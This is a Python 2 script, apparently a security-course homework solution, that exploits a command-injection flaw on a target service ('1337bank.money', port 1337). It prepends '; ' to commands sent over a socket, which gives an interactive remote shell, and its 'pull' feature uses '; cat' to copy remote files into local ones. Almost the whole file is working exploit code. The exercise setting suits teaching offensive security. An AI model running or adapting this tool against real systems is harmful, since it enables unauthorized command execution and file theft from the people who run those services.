"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import re
import sys

host = "1337bank.money" # IP address here
port = 1337 # Port here
path = []
pull_args = []

def execute_cmd(cmd, shell):

    pull_regex = 'pull[ \t]+([\/\w\d\.]+)[ \t]+([\/\w\d\.]+)'

    if shell:

        pre_cmd = "; "

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.recv(1024)

        for directory in path:
            pre_cmd += "cd " + directory + "; "

        if cmd == "cd":
            cmd += " " + path[-1]

        cmd = pre_cmd + cmd + "\n"

        s.send(cmd)

        s.recv(1024)
        data = s.recv(1024)
        print(" " + data.replace("\n", " ") + "\n")

    else:

        if cmd == "shell":

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.recv(1024)

        elif cmd == "pull":

            global pull_args

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.recv(1024)

            s.send("; cat " + pull_args[0] + "\n")
            s.recv(1024)
            data = s.recv(1024)

            f = open(pull_args[1], 'a')
            f.write(data)
            f.close()

            pull_args = []

        else:

            print("\n shell\t\t\t\t\tDrop into an interactive shell and allow users to gracefully exit")
            print(" pull <remote-path> <local-path>\tDownload files")
            print(" help\t\t\t\t\tShow this help menu")
            print(" quit\t\t\t\t\tQuit the shell\n")


# returns good format command as String if valid
# else returns String "invalid"
def valid_cmd(cmd, shell):

    if not shell:

        pull_regex = '^[ \t;]*pull[ \t]+([\/\w\d\.]+)[ \t]+([\/\w\d\.]+)'

        if re.match('^[ \t;]*shell', cmd):

            return "shell"

        elif re.match(pull_regex, cmd):

            global pull_args

            pull_args.append(re.match(pull_regex, cmd).group(1))
            pull_args.append(re.match(pull_regex, cmd).group(2))

            return "pull"

        elif re.match('^[ \t;]*help', cmd):

            return "help"

        elif re.match('^[ \t;]*quit', cmd):

            return "quit"

        return "invalid"

    else:

        if re.match('^[ \t;]*cd[ \t]+(\w+)[ \t;]*', cmd):

            path.append(re.match('^[ \t;]*cd[ \t]+(\w+)[ \t;]*', cmd).group(1))

            return "cd"

        elif re.match('^[ \t;]*exit[ \t;]*', cmd):

            return "exit"

        return cmd.strip()


if __name__ == '__main__':

    shell = False
    quit = False
    curr_dir = ""

    while not quit:

        valid_line = valid_cmd(raw_input(curr_dir + "> "), shell)
        execute_cmd(valid_line, shell)

        if path:
            curr_dir = path[-1]

        if not shell and valid_line == "shell":
            curr_dir = "/"
            shell = True
        elif shell and valid_line == "exit":
            path = []
            curr_dir = ""
            shell = False

        if valid_line == "quit" and not shell:
            quit = True

